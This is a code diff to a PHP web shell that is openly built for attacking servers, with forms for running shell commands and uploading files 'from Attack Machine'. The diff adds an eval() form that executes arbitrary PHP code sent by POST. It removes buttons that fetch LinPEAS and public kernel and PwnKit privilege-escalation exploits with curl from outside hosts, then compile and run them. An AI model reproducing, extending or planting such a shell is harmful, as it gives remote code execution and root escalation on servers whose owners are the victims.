@@ -134,6 +134,19 @@ if (isset($_GET['download'])) {
     }
 }
 
+// Handle PHP code execution
+$php_code = isset($_POST['php_code']) ? $_POST['php_code'] : '';
+$php_output = '';
+if ($php_code) {
+    ob_start();
+    try {
+        eval($php_code);
+    } catch (Throwable $e) {
+        echo "PHP Error: " . $e->getMessage();
+    }
+    $php_output = ob_get_clean();
+}
+
 // Cleanup Function
 $clean_status = '';
 if (isset($_GET['clean'])) {
@@ -298,6 +311,12 @@ if ($show_quicklinks) {
     <input type="submit" value="Run" />
 </form>
 
+<h3>Run PHP Code:</h3>
+<form method="POST">
+    <input type="text" name="php_code" placeholder="Enter PHP code (e.g., echo 'Hello';)" />
+    <input type="submit" value="Run PHP code" />
+</form>
+
 <h3>Upload Files from Attack Machine to This Machine:</h3>
 <form method="POST" enctype="multipart/form-data">
     <input type="file" name="upload_file" required />
@@ -356,75 +375,6 @@ if ($show_quicklinks) {
 <form method="POST" class="inline"><input type="hidden" name="command" value="cat /etc/hosts.allow" /><button type="submit">Hosts Allow</button></form>
 <form method="POST" class="inline"><input type="hidden" name="command" value="cat /etc/hosts.deny" /><button type="submit">Hosts Deny</button></form>
 
-<h3>Privilege Escalation Enumeration (LinPEAS):</h3>
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="curl -L -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/download/20250904-27f4363e/linpeas.sh" />
-    <button type="submit">Download linpeas.sh</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="chmod +x linpeas.sh" />
-    <button type="submit">Make linpeas.sh Executable</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="./linpeas.sh -a > linny 2>&1" />
-    <button type="submit">Run linpeas.sh (Output to linny)</button>
-</form>
-
-<h3>Kernel Exploit Downloads:</h3>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="curl -L -o exp_cve-2022-32250.c https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c" />
-    <button type="submit">Download CVE-2022-32250 PoC</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="curl -L -o exp_cve-2022-2586.c https://www.openwall.com/lists/oss-security/2022/08/29/5/1" />
-    <button type="submit">Download CVE-2022-2586 PoC</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="curl -L -o exp_cve-2021-22555.c https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c" />
-    <button type="submit">Download CVE-2021-22555 PoC</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="curl -L -o exp_cve-2019-13272.c https://raw.githubusercontent.com/snorez/exploits/refs/heads/master/xfrm_poc_RE_challenge/lucky0_RE.c" />
-    <button type="submit">Download CVE-2019-15666 PoC</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="curl -L -o exp_cve-2019-13272.c https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c" />
-    <button type="submit">Download CVE-2019-13272 PoC</button>
-</form>
-
-<h3>PwnKit (Polkit) Exploits:</h3>
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="curl -L -o pwnkit.c https://raw.githubusercontent.com/antonioCoco/CVE-2021-4034/main/pwnkit.c" />
-    <button type="submit">Download PwnKit C PoC</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="curl -L -o pwnkit.py https://raw.githubusercontent.com/antonioCoco/CVE-2021-4034/main/pwnkit.py" />
-    <button type="submit">Download PwnKit Python PoC</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="chmod +x pwnkit.c" />
-    <button type="submit">chmod +x pwnkit.c</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="gcc pwnkit.c -o pwnkit && ./pwnkit" />
-    <button type="submit">Compile & Run PwnKit C</button>
-</form>
-
-<form method="POST" class="inline">
-    <input type="hidden" name="command" value="python3 pwnkit.py" />
-    <button type="submit">Run PwnKit Python</button>
-</form>
-
 <h3>Cleanup Uploaded/Downloaded Files:</h3>
 <form method="GET">
     <input type="hidden" name="clean" value="true" />
@@ -433,6 +383,7 @@ if ($show_quicklinks) {
 
 <?php
 if ($command) echo "<h3>Command: $command</h3><pre id=\"command_output\">$output</pre>";
+if ($php_code) echo "<h3>PHP Code:</h3><pre id=\"php_output\">$php_output</pre>";
 if ($upload_status) echo "<h3>Upload Status:</h3><pre>$upload_status</pre>";
 if ($download_status) echo "<h3>Download Status:</h3><pre>$download_status</pre>";
 if ($clean_status) echo "<h3>Cleanup Status:</h3><pre>$clean_status</pre>";
